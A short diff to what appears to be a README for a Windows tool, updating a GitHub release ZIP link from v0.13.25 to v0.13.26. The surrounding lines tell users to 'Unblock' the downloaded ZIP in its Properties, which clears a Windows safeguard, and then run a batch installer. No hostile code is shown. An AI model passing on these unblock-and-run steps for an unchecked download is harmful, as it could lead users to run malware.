@@ -29,7 +29,7 @@ Download the complete Windows ZIP below. Do not download only the `Krea2DiscordC
 
 Before extracting it, right-click the ZIP, select **Properties**, enable **Unblock**, and select **Apply**. Then extract it and double-click `START HERE - INSTALL.bat`.
 
-https://github.com/pixelgraple/KREA2-Vision-Suite/raw/main/releases/Krea2VisionSuite-v0.13.25-win64.zip
+https://github.com/pixelgraple/KREA2-Vision-Suite/raw/main/releases/Krea2VisionSuite-v0.13.26-win64.zip
 
 The installer will:
 
